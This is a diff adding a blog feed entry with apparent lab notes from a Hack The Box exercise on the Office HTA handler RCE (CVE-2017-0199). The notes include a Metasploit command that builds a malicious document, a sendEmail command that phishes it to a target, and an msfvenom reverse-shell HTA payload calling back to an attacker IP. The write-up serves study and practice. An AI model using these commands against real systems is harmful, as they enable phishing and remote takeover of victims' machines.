@@ -4,13 +4,84 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-05-08T15:32:50+08:00</updated>
+ <updated>2022-05-14T10:54:48+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>HTA Handler RCE (CVE-2017-0199)</title>
+   <link href="https://mvineza.github.io/spindel/2022/05/14/hta-handler-rce-cve20170199"/>
+   <updated>2022-05-14T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/05/14/HTA-Handler-RCE--CVE20170199-</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;Attacker sends document with OLE to victim&lt;/li&gt;
+  &lt;li&gt;Victim clicks document (or download attachment from email)&lt;/li&gt;
+  &lt;li&gt;Document sends GET request to attacker IP to download a malicious HTA file. Once this file is downloaded, victim machine executes it due to logic bug of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mshta.exe&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;exploits&quot;&gt;Exploits&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;[CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler&lt;/td&gt;
+          &lt;td&gt;Mandiant](https://www.mandiant.com/resources/cve-2017-0199-hta-handler) - using RTF and Word documnets&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.trendmicro.com/en_sg/research/17/h/cve-2017-0199-new-malware-abuses-powerpoint-slide-show.html&quot;&gt;CVE-2017-0199: New Malware Abuses PowerPoint Slides&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;tools&quot;&gt;Tools&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/bhdresh/CVE-2017-0199&quot;&gt;CVE-2017-0199 Python exploit toolkit&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/HTA%20Handler%20RCE%20(CVE-2017-0199)/Scenario1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Metasploit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Generate document and run webserver&lt;/span&gt;
+msfconsole &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;use windows/fileformat/office_word_hta; set srvhost tun0; set filename Procedures.doc; set lhost tun0; run&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Send generated document to victim and wait for the reverse&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# connection in metasploit&lt;/span&gt;
+sendEmail &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nico@megabank.com &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; hacker@kali.com &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; reel:25 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Procedures &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;tls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /home/kali/.msf4/local/Procedures.doc &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;See attachment for procedures&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;troubleshooting&quot;&gt;Troubleshooting&lt;/h2&gt;
+&lt;p&gt;The python exploit in github didnt worked for me. When I tried to see in wireshark the network connections, I saw that victim did a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; request to attacker, but attacker didnt respond back. Probably there is something wrong on http server implemention?&lt;/p&gt;
+
+&lt;p&gt;From other writeups, they didnt use the http server that comes up with the exploit kit but instead they used their own http server.&lt;/p&gt;
+
+&lt;h2 id=&quot;alternatives&quot;&gt;Alternatives&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;You can generate HTA file via this methods&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# msfvenom&lt;/span&gt;
+msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.3 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; hta-psh &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; msfv.hta
+
+&lt;span class=&quot;c&quot;&gt;# via nishang&lt;/span&gt;
+https://www.youtube.com/watch?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ob9SgtFm6_g&amp;amp;t&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;794s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;HTB Reel&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.fortinet.com/blog/threat-research/cve-2017-11826-exploited-in-the-wild-with-politically-themed-rtf-document&quot;&gt;CVE-2017-11826 Exploited in the Wild with Politically Themed RTF Document&lt;/a&gt;  - maybe also related as this is an RTF exploit&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Redis 4 and 5 Unauthenticated RCE</title>
